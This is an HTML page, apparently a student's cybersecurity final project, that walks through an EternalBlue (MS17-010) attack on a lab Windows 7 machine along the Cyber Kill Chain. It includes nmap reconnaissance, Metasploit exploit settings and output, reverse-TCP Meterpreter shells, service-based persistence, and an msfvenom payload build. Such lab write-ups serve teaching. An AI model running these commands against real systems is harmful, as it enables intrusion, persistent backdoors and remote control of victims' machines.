@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Cyber Security Hybrid Project</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=IBM+Plex+Sans:wght@300;400;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0d1117;
+    --surface: #161b22;
+    --border: #21262d;
+    --text: #e6edf3;
+    --muted: #7d8590;
+    --accent: #58a6ff;
+    --green: #3fb950;
+    --red: #f85149;
+    --yellow: #d29922;
+    --tag-bg: #1f2937;
+    --cmd-bg: #0d1117;
+    --cmd-border: #30363d;
+    color-scheme: dark;
+  }
+  @media (prefers-color-scheme: light) {
+    :root:not([data-theme="dark"]) {
+      --bg: #f6f8fa;
+      --surface: #ffffff;
+      --border: #d0d7de;
+      --text: #1f2328;
+      --muted: #57606a;
+      --accent: #0969da;
+      --green: #1a7f37;
+      --red: #cf222e;
+      --yellow: #9a6700;
+      --tag-bg: #eef2ff;
+      --cmd-bg: #f6f8fa;
+      --cmd-border: #d0d7de;
+    }
+  }
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'IBM Plex Sans', system-ui, sans-serif;
+    font-size: 15px;
+    line-height: 1.7;
+    padding: 2.5rem 1.5rem;
+  }
+  .container {
+    max-width: 780px;
+    margin: 0 auto;
+  }
+
+  /* Header */
+  .header {
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 1.5rem;
+    margin-bottom: 2.5rem;
+  }
+  .badge {
+    display: inline-block;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.7rem;
+    letter-spacing: 0.08em;
+    color: var(--accent);
+    background: rgba(88, 166, 255, 0.1);
+    border: 1px solid rgba(88, 166, 255, 0.25);
+    padding: 0.2rem 0.6rem;
+    border-radius: 4px;
+    margin-bottom: 0.75rem;
+  }
+  h1 {
+    font-size: 1.75rem;
+    font-weight: 600;
+    color: var(--text);
+    line-height: 1.3;
+    margin-bottom: 1rem;
+  }
+  .meta-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 0.5rem 2rem;
+    margin-top: 1rem;
+  }
+  .meta-row { font-size: 0.875rem; color: var(--muted); }
+  .meta-row strong { color: var(--text); font-weight: 600; }
+  code.ip {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.8rem;
+    color: var(--accent);
+    background: rgba(88, 166, 255, 0.08);
+    padding: 0.1rem 0.35rem;
+    border-radius: 3px;
+  }
+
+  /* Summary box */
+  .summary {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    border-radius: 6px;
+    padding: 1rem 1.25rem;
+    margin-bottom: 2.5rem;
+    font-size: 0.9rem;
+    color: var(--muted);
+    line-height: 1.65;
+  }
+  .summary strong { color: var(--text); }
+
+  /* Kill chain progress */
+  .kill-chain {
+    display: flex;
+    gap: 0;
+    margin-bottom: 3rem;
+    overflow-x: auto;
+    padding-bottom: 0.25rem;
+  }
+  .kc-step {
+    flex: 1;
+    min-width: 80px;
+    text-align: center;
+    padding: 0.5rem 0.25rem;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.6rem;
+    color: var(--muted);
+    border-bottom: 2px solid var(--border);
+    position: relative;
+  }
+  .kc-step.done {
+    color: var(--green);
+    border-bottom-color: var(--green);
+  }
+  .kc-step .kc-num { font-size: 0.75rem; font-weight: 600; display: block; margin-bottom: 0.15rem; }
+
+  /* Phase sections */
+  .phase {
+    margin-bottom: 2.75rem;
+  }
+  .phase-header {
+    display: flex;
+    align-items: baseline;
+    gap: 0.75rem;
+    margin-bottom: 1.1rem;
+    padding-bottom: 0.6rem;
+    border-bottom: 1px solid var(--border);
+  }
+  .phase-num {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.7rem;
+    color: var(--muted);
+    min-width: 1.8rem;
+  }
+  h2 {
+    font-size: 1.05rem;
+    font-weight: 600;
+    color: var(--text);
+  }
+  .phase-tag {
+    margin-left: auto;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.65rem;
+    padding: 0.15rem 0.5rem;
+    border-radius: 3px;
+    background: var(--tag-bg);
+    color: var(--muted);
+  }
+
+  /* Body text */
+  p {
+    color: var(--muted);
+    font-size: 0.9rem;
+    margin-bottom: 0.75rem;
+    max-width: 68ch;
+  }
+
+  /* Command blocks */
+  .cmd-block {
+    background: var(--cmd-bg);
+    border: 1px solid var(--cmd-border);
+    border-radius: 6px;
+    margin: 0.75rem 0 1.1rem;
+    overflow: hidden;
+  }
+  .cmd-label {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.65rem;
+    color: var(--muted);
+    padding: 0.35rem 0.9rem;
+    border-bottom: 1px solid var(--cmd-border);
+    background: var(--surface);
+  }
+  .cmd-body {
+    padding: 0.75rem 0.9rem;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.7;
+    color: var(--text);
+    white-space: pre;
+    overflow-x: auto;
+  }
+  .cmd-body .prompt { color: var(--green); }
+  .cmd-body .comment { color: var(--muted); }
+  .cmd-body .highlight { color: var(--yellow); }
+  .cmd-body .success { color: var(--green); }
+  .cmd-body .danger { color: var(--red); }
+
+  /* Finding cards */
+  .finding {
+    display: flex;
+    gap: 0.75rem;
+    align-items: flex-start;
+    margin-bottom: 0.5rem;
+    font-size: 0.875rem;
+  }
+  .finding-icon {
+    font-size: 0.8rem;
+    margin-top: 0.1rem;
+    flex-shrink: 0;
+  }
+  .finding-text { color: var(--muted); }
+  .finding-text strong { color: var(--text); }
+
+  /* Vuln alert */
+  .vuln-alert {
+    background: rgba(248, 81, 73, 0.07);
+    border: 1px solid rgba(248, 81, 73, 0.25);
+    border-radius: 6px;
+    padding: 0.75rem 1rem;
+    margin: 0.75rem 0;
+    font-size: 0.875rem;
+  }
+  .vuln-alert .vuln-title {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.75rem;
+    color: var(--red);
+    font-weight: 600;
+    margin-bottom: 0.35rem;
+  }
+  .vuln-alert .vuln-row { color: var(--muted); font-size: 0.8rem; margin-bottom: 0.15rem; }
+  .vuln-alert .vuln-row strong { color: var(--text); }
+
+  /* Config table */
+  .config-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 0.835rem;
+    margin: 0.75rem 0 1rem;
+  }
+  .config-table th {
+    text-align: left;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.65rem;
+    color: var(--muted);
+    padding: 0.35rem 0.75rem;
+    border-bottom: 1px solid var(--border);
+    font-weight: 400;
+  }
+  .config-table td {
+    padding: 0.45rem 0.75rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--muted);
+    vertical-align: top;
+  }
+  .config-table td:first-child {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.78rem;
+    color: var(--text);
+    white-space: nowrap;
+  }
+  .config-table td code {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.78rem;
+    color: var(--accent);
+  }
+
+  /* Result box */
+  .result-box {
+    background: rgba(63, 185, 80, 0.07);
+    border: 1px solid rgba(63, 185, 80, 0.2);
+    border-radius: 6px;
+    padding: 0.75rem 1rem;
+    margin: 0.75rem 0;
+    font-size: 0.875rem;
+    color: var(--muted);
+  }
+  .result-box .result-title {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.7rem;
+    color: var(--green);
+    margin-bottom: 0.3rem;
+  }
+
+  /* Separator */
+  .sep { border: none; border-top: 1px solid var(--border); margin: 2.5rem 0; }
+
+  h3 {
+    font-size: 0.85rem;
+    font-weight: 600;
+    color: var(--text);
+    margin: 1.1rem 0 0.4rem;
+    text-transform: none;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <!-- Header -->
+  <div class="header">
+    <div class="badge">BrainerX · Cybersecurity Final Project</div>
+    <h1>Cyber Security Hybrid Project</h1>
+    <p style="color:var(--muted); font-size:0.9rem; max-width:60ch;">
+      Complete attack demonstration following the Cyber Kill Chain — MS17-010 (EternalBlue) exploit against a Windows 7 target, with persistence and reverse shell C2.
+    </p>
+    <div class="meta-grid">
+      <div class="meta-row"><strong>Attacker (Kali Linux)</strong><br><code class="ip">192.168.156.128</code></div>
+      <div class="meta-row"><strong>Victim (Windows 7)</strong><br><code class="ip">192.168.156.143</code></div>
+      <div class="meta-row"><strong>Exploit</strong><br>MS17-010 · EternalBlue · CVE-2017-0143</div>
+      <div class="meta-row"><strong>Payload</strong><br>windows/x64/meterpreter/reverse_tcp</div>
+    </div>
+  </div>
+
+  <!-- Summary -->
+  <div class="summary">
+    The attack exploited the <strong>MS17-010</strong> vulnerability in Microsoft SMBv1, using the <strong>EternalBlue</strong> exploit to gain remote code execution on a Windows 7 machine. After gaining <strong>NT AUTHORITY\SYSTEM</strong> level access, persistence was established via a Windows service that survives reboots, followed by a reverse TCP connection for ongoing command and control.
+  </div>
+
+  <!-- Kill chain tracker -->
+  <div class="kill-chain">
+    <div class="kc-step done"><span class="kc-num">1</span>Recon</div>
+    <div class="kc-step done"><span class="kc-num">2</span>Weaponize</div>
+    <div class="kc-step done"><span class="kc-num">3</span>Deliver</div>
+    <div class="kc-step done"><span class="kc-num">4</span>Exploit</div>
+    <div class="kc-step done"><span class="kc-num">5</span>Install</div>
+    <div class="kc-step done"><span class="kc-num">6</span>C2</div>
+    <div class="kc-step done"><span class="kc-num">7</span>Actions</div>
+  </div>
+
+  <!-- PHASE 1: Reconnaissance -->
+  <div class="phase">
+    <div class="phase-header">
+      <span class="phase-num">01</span>
+      <h2>Reconnaissance</h2>
+      <span class="phase-tag">nmap · ping</span>
+    </div>
+
+    <p>Before scanning, the Windows Firewall on the victim VM was disabled to avoid blocking probe packets. Then two scans were run from the Kali machine.</p>
+
+    <h3>Host discovery — ping</h3>
+    <div class="cmd-block">
+      <div class="cmd-label">kali@attacker</div>
+      <div class="cmd-body"><span class="prompt">$</span> ping 192.168.156.143
+
+<span class="success">4 packets transmitted, 4 received, 0% packet loss</span>
+<span class="comment">→ Target is alive and reachable</span></div>
+    </div>
+
+    <h3>Service scan — nmap -sV</h3>
+    <div class="cmd-block">
+      <div class="cmd-label">kali@attacker</div>
+      <div class="cmd-body"><span class="prompt">$</span> nmap -sV 192.168.156.143
+
+PORT      STATE  SERVICE       VERSION
+135/tcp   open   msrpc         Microsoft Windows RPC
+139/tcp   open   netbios-ssn   Microsoft Windows NetBIOS-SSN
+<span class="highlight">445/tcp   open   microsoft-ds  Windows 7–10 microsoft-ds (WORKGROUP)</span>
+...
+MAC Address: 00:0C:29:7E:A0:4A (VMware)</div>
+    </div>
+
+    <div class="finding">
+      <span class="finding-icon">💡</span>
+      <span class="finding-text"><strong>Port 445 (SMB)</strong> is open — the Windows network/file-sharing protocol. This is the attack surface for EternalBlue.</span>
+    </div>
+
+    <h3>Vulnerability scan — nmap --script vuln</h3>
+    <div class="cmd-block">
+      <div class="cmd-label">kali@attacker</div>
+      <div class="cmd-body"><span class="prompt">$</span> nmap --script vuln 192.168.156.143
+
+Host script results:
+  smb-vuln-ms10-061:  NT_STATUS_ACCESS_DENIED
+  smb-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+<span class="danger">  smb-vuln-ms17-010:
+    VULNERABLE
+    Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+    IDs: CVE:CVE-2017-0143
+    Risk factor: HIGH
+    Disclosure date: 2017-03-14</span>
+  smb-vuln-ms10-054: false</div>
+    </div>
+
+    <div class="vuln-alert">
+      <div class="vuln-title">⚠ VULNERABLE — smb-vuln-ms17-010</div>
+      <div class="vuln-row"><strong>CVE:</strong> CVE-2017-0143</div>
+      <div class="vuln-row"><strong>Risk:</strong> HIGH — Remote Code Execution in Microsoft SMBv1</div>
+      <div class="vuln-row"><strong>Disclosure date:</strong> 2017-03-14</div>
+    </div>
+  </div>
+
+  <!-- PHASE 2: Weaponization -->
+  <div class="phase">
+    <div class="phase-header">
+      <span class="phase-num">02</span>
+      <h2>Weaponization</h2>
+      <span class="phase-tag">Metasploit · EternalBlue</span>
+    </div>
+
+    <p>Metasploit Framework was launched on Kali Linux. The <code style="font-family:IBM Plex Mono,monospace; font-size:0.8rem; color:var(--accent);">ms17-010</code> module was searched and the <strong>EternalBlue</strong> exploit module was selected.</p>
+
+    <div class="cmd-block">
+      <div class="cmd-label">msfconsole</div>
+      <div class="cmd-body"><span class="prompt">msf &gt;</span> search ms17-010
+
+Matching Modules
+  0  exploit/windows/smb/ms17_010_eternalblue  (Rank: average)
+     └ Targets: Automatic, Windows 7, Embedded Standard 7…
+  1  exploit/windows/smb/ms17_010_psexec       (Rank: normal)
+  2  auxiliary/admin/smb/ms17_010              (Rank: normal)
+  3  auxiliary/scanner/smb/smb_ms17_010        (Rank: normal, Check: Yes)
+
+<span class="prompt">msf &gt;</span> <span class="highlight">use exploit/windows/smb/ms17_010_eternalblue</span></div>
+    </div>
+
+    <p>The EternalBlue module was selected. Module options were then configured:</p>
+
+    <table class="config-table">
+      <tr><th>Option</th><th>Value set</th><th>Purpose</th></tr>
+      <tr><td>RHOSTS</td><td><code>192.168.156.143</code></td><td>Target (victim) IP</td></tr>
+      <tr><td>LHOST</td><td><code>192.168.156.128</code></td><td>Attacker IP (listener)</td></tr>
+      <tr><td>LPORT</td><td><code>4444</code></td><td>Listener port</td></tr>
+      <tr><td>PAYLOAD</td><td><code>windows/x64/meterpreter/reverse_tcp</code></td><td>Reverse Meterpreter shell</td></tr>
+    </table>
+  </div>
+
+  <!-- PHASE 3: Delivery & Exploitation -->
+  <div class="phase">
+    <div class="phase-header">
+      <span class="phase-num">03 – 04</span>
+      <h2>Delivery &amp; Exploitation</h2>
+      <span class="phase-tag">SMBv1 · RCE</span>
+    </div>
+
+    <p>The exploit was launched. Metasploit sent the EternalBlue payload over SMB (port 445) to the victim machine.</p>
+
+    <div class="cmd-block">
+      <div class="cmd-label">msfconsole</div>
+      <div class="cmd-body"><span class="prompt">msf exploit(ms17_010_eternalblue) &gt;</span> exploit
+
+[*] Started reverse TCP handler on 192.168.156.128:4444
+[*] 192.168.156.143:445 - Verifying target arch... Windows 7 Professional (64 bit)
+[+] 192.168.156.143:445 - The target is vulnerable.
+[*] 192.168.156.143:445 - Connection established for exploitation.
+[*] ETERNALBLUE overwrite completed successfully (0x00000000)
+[*] Sending stage (240002 bytes) to 192.168.156.143
+<span class="success">[*] Meterpreter session 1 opened (192.168.156.128:4444 → 192.168.156.143:49560)</span></div>
+    </div>
+
+    <div class="result-box">
+      <div class="result-title">✓ Session 1 opened</div>
+      Communication channel established between Kali and the Windows 7 VM.
+    </div>
+
+    <h3>Verifying access</h3>
+    <p>Shell was dropped into and access level confirmed with <code style="font-family:IBM Plex Mono,monospace;font-size:0.8rem;color:var(--accent);">getuid</code> and <code style="font-family:IBM Plex Mono,monospace;font-size:0.8rem;color:var(--accent);">sysinfo</code>.</p>
+
+    <div class="cmd-block">
+      <div class="cmd-label">meterpreter session 1</div>
+      <div class="cmd-body"><span class="prompt">meterpreter &gt;</span> sysinfo
+Computer  : WIN-OL4C4HMJ383
+OS        : Windows 7 (6.1 Build 7601, Service Pack 1)
+Arch      : x64
+
+<span class="prompt">meterpreter &gt;</span> getuid
+<span class="success">Server username: NT AUTHORITY\SYSTEM</span>
+<span class="comment">→ Full system-level access achieved</span></div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-label">Windows shell — cleanup check</div>
+      <div class="cmd-body">C:\Windows\system32&gt; tasklist | findstr payload.exe
+payload.exe     1404   Services    0    2,156 K
+
+C:\Windows\system32&gt; taskkill /F /IM payload.exe
+<span class="success">SUCCESS: The process "payload.exe" with PID 1404 has been terminated.</span></div>
+    </div>
+  </div>
+
+  <!-- PHASE 5: Installation / Persistence -->
+  <div class="phase">
+    <div class="phase-header">
+      <span class="phase-num">05</span>
+      <h2>Installation / Persistence</h2>
+      <span class="phase-tag">Windows service · auto-start</span>
+    </div>
+
+    <p>Goal: maintain access even after the original Meterpreter session closes or the machine reboots. A Windows service-based persistence module was used.</p>
+
+    <div class="cmd-block">
+      <div class="cmd-label">msfconsole</div>
+      <div class="cmd-body"><span class="prompt">msf &gt;</span> use exploit/windows/persistence/service
+
+<span class="comment"># Configuration</span>
+<span class="prompt">msf exploit(persistence/service) &gt;</span> set LHOST 192.168.156.128
+<span class="prompt">msf exploit(persistence/service) &gt;</span> set SESSION 1
+<span class="prompt">msf exploit(persistence/service) &gt;</span> run
+
+[*] Running automatic check…
+[*] Payload written to C:\Windows\TEMP\ZF0.exe
+[*] Creating Windows service for persistence…
+<span class="success">[*] Meterpreter session 2 opened (192.168.156.128:4444 → 192.168.156.143:49160)</span></div>
+    </div>
+
+    <div class="finding">
+      <span class="finding-icon">📌</span>
+      <span class="finding-text">The payload was saved at <strong>C:\Windows\TEMP\ZF0.exe</strong> and registered as a Windows service, so it starts automatically on every boot.</span>
+    </div>
+
+    <h3>Generating a standalone payload (msfvenom)</h3>
+    <p>A separate reverse shell executable was also created for the C2 phase:</p>
+    <div class="cmd-block">
+      <div class="cmd-label">kali@attacker</div>
+      <div class="cmd-body"><span class="prompt">$</span> msfvenom -p windows/x64/meterpreter/reverse_tcp \
+    LHOST=192.168.156.128 LPORT=5386 \
+    -f exe -o payload.exe
+
+Payload size: 589 bytes
+<span class="success">Saved as: payload.exe</span></div>
+    </div>
+  </div>
+
+  <!-- PHASE 6: Command & Control -->
+  <div class="phase">
+    <div class="phase-header">
+      <span class="phase-num">06</span>
+      <h2>Command &amp; Control (C2)</h2>
+      <span class="phase-tag">multi/handler · reverse TCP</span>
+    </div>
+
+    <p>A Metasploit <code style="font-family:IBM Plex Mono,monospace;font-size:0.8rem;color:var(--accent);">multi/handler</code> listener was set up to catch the callback from the payload dropped in phase 5. When the Windows VM is rebooted, the persistence service runs and phones back to the attacker.</p>
+
+    <div class="cmd-block">
+      <div class="cmd-label">msfconsole — listener setup</div>
+      <div class="cmd-body"><span class="prompt">msf &gt;</span> use exploit/multi/handler
+<span class="prompt">msf exploit(multi/handler) &gt;</span> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+<span class="prompt">msf exploit(multi/handler) &gt;</span> set LHOST 192.168.156.128
+<span class="prompt">msf exploit(multi/handler) &gt;</span> set LPORT 5386
+<span class="prompt">msf exploit(multi/handler) &gt;</span> exploit -j
+
+[*] Exploit running as background job 1.
+<span class="success">[*] Started reverse TCP handler on 192.168.156.128:5386</span></div>
+    </div>
+
+    <p>The Windows 7 VM was restarted to simulate a real reboot. The persistence service triggered on startup and connected back.</p>
+
+    <div class="cmd-block">
+      <div class="cmd-label">incoming sessions after reboot</div>
+      <div class="cmd-body"><span class="success">[*] Meterpreter session 3 opened (192.168.156.128:5386 → 192.168.156.143:49151)</span>
+<span class="success">[*] Meterpreter session 4 opened (192.168.156.128:5386 → 192.168.156.143:49156)</span>
+<span class="success">[*] Meterpreter session 5 opened (192.168.156.128:5386 → 192.168.156.143:49199)</span>
+<span class="success">[*] Meterpreter session 6 opened (192.168.156.128:5386 → 192.168.156.143:49160)</span></div>
+    </div>
+
+    <div class="result-box">
+      <div class="result-title">✓ Persistent C2 established</div>
+      Multiple sessions opened after the machine rebooted — the persistence service is working. The attacker has ongoing access without needing to re-exploit.
+    </div>
+  </div>
+
+  <hr class="sep">
+
+  <!-- Summary table -->
+  <div class="phase">
+    <div class="phase-header">
+      <span class="phase-num"></span>
+      <h2>Kill Chain Summary</h2>
+    </div>
+    <table class="config-table">
+      <tr><th>#</th><th>Phase</th><th>Tool / Technique</th><th>Outcome</th></tr>
+      <tr><td>1</td><td>Reconnaissance</td><td>ping, nmap -sV, nmap --script vuln</td><td>Port 445 open; MS17-010 confirmed VULNERABLE</td></tr>
+      <tr><td>2</td><td>Weaponization</td><td>Metasploit — ms17_010_eternalblue</td><td>Exploit module configured with target + payload</td></tr>
+      <tr><td>3</td><td>Delivery</td><td>SMB (port 445) over LAN</td><td>Exploit packet sent to victim machine</td></tr>
+      <tr><td>4</td><td>Exploitation</td><td>EternalBlue — CVE-2017-0143</td><td>RCE; Meterpreter session 1 opened</td></tr>
+      <tr><td>5</td><td>Installation</td><td>exploit/windows/persistence/service + msfvenom</td><td>Windows service created; payload.exe dropped</td></tr>
+      <tr><td>6</td><td>C2</td><td>multi/handler — reverse_tcp :5386</td><td>Multiple sessions on reboot; persistent access</td></tr>
+      <tr><td>7</td><td>Actions</td><td>Meterpreter shell</td><td>NT AUTHORITY\SYSTEM — full control of victim</td></tr>
+    </table>
+  </div>
+
+</div>
+</body>
+</html>
